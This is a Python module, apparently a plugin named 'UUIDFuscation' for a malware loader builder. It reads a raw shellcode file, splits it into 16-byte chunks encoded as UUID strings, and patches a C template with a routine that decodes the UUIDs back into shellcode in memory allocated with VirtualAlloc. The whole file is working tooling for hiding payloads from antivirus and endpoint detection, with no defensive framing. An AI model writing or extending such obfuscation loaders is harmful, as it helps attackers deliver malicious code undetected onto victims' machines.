import os
import sys
import random

def desc():
    return "UUIDFuscation"

def getPayload():
    filename = './payload.bin'
    try:
        with open(filename, 'rb') as file:
            # Read the entire file
            file_content = file.read()
            return file_content
    except IOError as e:
        print("[!] I/O error({0}): {1}".format(e.errno, e.strerror))
        raise
    
def get_hex_string(data):
    result = ''

    for i in range(0, len(data), 16):
        result += "\t"
        chunk = data[i:i+16]
        for byte in chunk:
            result += f"0x{byte:02x}, "
        result += "\n"

    return result[1:-3]

def shellcode_to_uuids(data):
    uuids = []

    # Check if the data is divisible by 16
    if len(data) % 16 != 0:
        # Add random bytes to make the data divisible by 16
        data += bytearray(random.getrandbits(8) for _ in range(16 - len(data) % 16))

    # Split the data into chunks of 16 bytes
    for i in range(0, len(data), 16):
        chunk = data[i:i+16]

        # Create a UUID from the chunk
        uuid = f"{chunk[0]:02x}{chunk[1]:02x}{chunk[2]:02x}{chunk[3]:02x}-{chunk[4]:02x}{chunk[5]:02x}-{chunk[6]:02x}{chunk[7]:02x}-{chunk[8]:02x}{chunk[9]:02x}-{chunk[10]:02x}{chunk[11]:02x}{chunk[12]:02x}{chunk[13]:02x}{chunk[14]:02x}{chunk[15]:02x}"
        uuids.append(uuid)

    return uuids

def create_uuids_string(uuids):
    uuids_str = ""
    # Create the string with the UUIDs
    for i, mac in enumerate(uuids):
        uuids_str += f"\"{mac}\", "
        if (i+1) % 3 == 0:
            # If its the last UUID, don't add a new line
            if i != len(uuids) - 1:
                uuids_str += "\n\t"
            
    # Remove the last comma
    uuids_str = uuids_str[:-2]

    return uuids_str

def fill_template(obfuscated, original_data_size, num_uuids):
    libs = f"#define SHELLCODE_SIZE	{original_data_size}\n#define NUM_UUIDS			{num_uuids}"
    functions = ''' \
// Deobfuscate the shellcode
VOID DeobfuscateShellcode(unsigned char *ObsShellcode[], PBYTE DeobsShellcode) {
    // Filler variable to track progress
    int filler = 0;
    // For each UUID
    for (int i = 0; i < NUM_UUIDS; i++) {
        // For each byte in the UUID
        for (int j = 0; j < strlen(ObsShellcode[i]); j++) {
            if (ObsShellcode[i][j] == '-') {
                continue;
            }
            else {
                // If we have filled the buffer, break
                if (filler >= SHELLCODE_SIZE) {
                    break;
                }
                // Convert the hex string to a byte
                char hex[3] = { ObsShellcode[i][j], ObsShellcode[i][j + 1], '\0' };
                DeobsShellcode[filler] = (BYTE)strtol(hex, NULL, 16);
                filler++;
                j++;
            }
        }
    }
}
'''

    payload_mods = '''\
    SIZE_T      	sPayloadSize	= SHELLCODE_SIZE;

    // Allocating buffer to hold decrypted shellcode
    PBYTE pShellcode = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Copy encrypted shellcode to decrypted shellcode buffer
    if (pShellcode)
        memcpy(pShellcode, pPayload, sPayloadSize);

    // Deobfuscation
    DeobfuscateShellcode(pPayload, pShellcode);
'''

    # Read the content of the input file
    with open("./src/main.c", 'r') as file:
        content = file.read()

    # Replace the template
    modified_content = content.replace("{{LIBS}}", libs + "\n{{LIBS}}") \
                              .replace("{{FUNCTIONS}}", functions + "\n{{FUNCTIONS}}") \
                              .replace("const unsigned char pPayload[] = {", "unsigned char *pPayload[] = {") \
                              .replace("{{PAYLOAD}}", obfuscated) \
                              .replace("{{PAYLOAD_MODS}}", payload_mods)

    # Write the modified content to the output file
    with open("./src/main.c", 'w') as file:
        file.write(modified_content)

def run():
    original_data = getPayload()

    # Number of bytes in the original data
    original_data_size = len(original_data)

    # Convert the original data to UUID
    obfuscated_data = shellcode_to_uuids(bytearray(original_data))

    # Create the string with the UUIDs
    uuids_str = create_uuids_string(obfuscated_data)

    # Fill template
    fill_template(uuids_str, str(original_data_size), len(obfuscated_data))

    return